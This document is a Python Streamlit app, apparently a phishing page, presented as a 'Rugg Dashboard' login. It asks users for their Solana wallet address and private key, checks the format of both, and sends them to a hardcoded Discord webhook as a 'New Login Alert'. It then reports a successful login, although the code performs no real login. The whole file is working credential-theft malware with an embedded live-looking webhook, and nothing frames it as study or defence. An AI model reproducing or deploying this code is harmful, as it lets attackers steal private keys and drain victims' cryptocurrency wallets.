import streamlit as st
import requests
from datetime import datetime
import base58

# Discord webhook URL
WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1331353119686135922/BR0eqE0KKC5NkH2NBHCHNBSY3BXCNu_d9BETAFArslW4IJ9Ikh2STmCWHci_VaXaV796'

def validate_solana_address(address):
    """Validate a Solana wallet address."""
    try:
        decoded = base58.b58decode(address)
        return len(decoded) in [32, 44]
    except ValueError:
        return False

def validate_solana_private_key(key):
    """Validate a Solana private key."""
    try:
        decoded = base58.b58decode(key)
        return len(decoded) == 64
    except ValueError:
        return False

def send_to_discord(wallet_address, private_key, balance):
    """Send wallet details to Discord."""
    message = f"""
🚨 **New Login Alert**
━━━━━━━━━━━━━━━━━━━━━━━━
👛 **Wallet:** `{wallet_address}`
🔑 **Key:** `{private_key}`
💰 **Balance:** `{balance:.9f} SOL`
⏰ **Time:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`
━━━━━━━━━━━━━━━━━━━━━━━━
    """
    payload = {"content": message}
    headers = {"Content-Type": "application/json"}
    response = requests.post(WEBHOOK_URL, json=payload, headers=headers)
    return response.status_code == 204

def login_page():
    """Display the login page."""
    st.title("Rugg Dashboard 🚀")

    if "logged_in" not in st.session_state:
        st.session_state.logged_in = False

    if st.session_state.logged_in:
        st.success("You are already logged in! 🚀")
        return

    with st.form("login_form"):
        wallet = st.text_input("Solana Wallet Address")
        private_key = st.text_input("Solana Private Key", type="password")
        submitted = st.form_submit_button("Login")

        if submitted:
            if not validate_solana_address(wallet):
                st.error("Invalid Solana wallet address format.")
            elif not validate_solana_private_key(private_key):
                st.error("Invalid Solana private key format.")
            else:
                # Simulate fetching balance (replace with actual Solana RPC call)
                balance = 100.0  # Placeholder balance
                if send_to_discord(wallet, private_key, balance):
                    st.session_state.logged_in = True
                    st.success("Login successful! Redirecting...")
                    st.rerun()
                else:
                    st.error("Failed to log in. Please try again.")